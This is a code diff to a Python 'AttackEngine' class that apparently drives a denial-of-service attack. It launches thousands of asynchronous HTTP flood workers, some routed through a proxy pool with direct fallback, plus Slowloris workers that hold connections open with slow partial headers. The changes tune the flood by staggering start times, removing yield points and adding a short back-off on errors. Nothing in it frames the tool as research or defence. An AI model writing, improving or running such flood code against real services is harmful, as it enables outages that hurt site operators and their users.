@@ -137,9 +137,7 @@ class AttackEngine:
         for i in range(flood_count):
             use_px = use_proxies and (i % 10 >= 3)
             workers.append(asyncio.create_task(
-                self._worker(d_session, base, port, method, deadline, use_px, p_timeout)))
-            if i % 200 == 199:
-                await asyncio.sleep(0)
+                self._worker(d_session, base, port, method, deadline, use_px, p_timeout, i)))
 
         # Slowloris workers
         parsed = urlparse(target)
@@ -147,16 +145,17 @@ class AttackEngine:
         for i in range(slow_count):
             workers.append(asyncio.create_task(
                 self._slowloris_worker(host, port, deadline)))
-            if i % 100 == 99:
-                await asyncio.sleep(0)
 
         try:
             await asyncio.gather(*workers, return_exceptions=True)
         finally:
             await d_session.close()
 
-    async def _worker(self, d_session, base, port, method, deadline, use_px, p_timeout):
+    async def _worker(self, d_session, base, port, method, deadline, use_px, p_timeout, worker_id=0):
         """Single worker — fires continuously until stopped."""
+        # Stagger start: spread workers over 3 seconds
+        await asyncio.sleep(random.uniform(0, min(3.0, worker_id * 0.002)))
+
         while not self._stop.is_set():
             if deadline and time.time() >= deadline:
                 break
@@ -165,7 +164,6 @@ class AttackEngine:
                 await asyncio.sleep(0.5)
                 continue
 
-            # Auto-fallback: if proxies dead, go direct
             if use_px and proxy_pool.alive_count < 100:
                 use_px = False
 
@@ -175,7 +173,7 @@ class AttackEngine:
                 else:
                     await self._fire_direct(d_session, base, port, method)
             except Exception:
-                pass
+                await asyncio.sleep(0.01)
 
     async def _slowloris_worker(self, host, port, deadline):
         """Open TCP connection and send partial HTTP headers very slowly."""
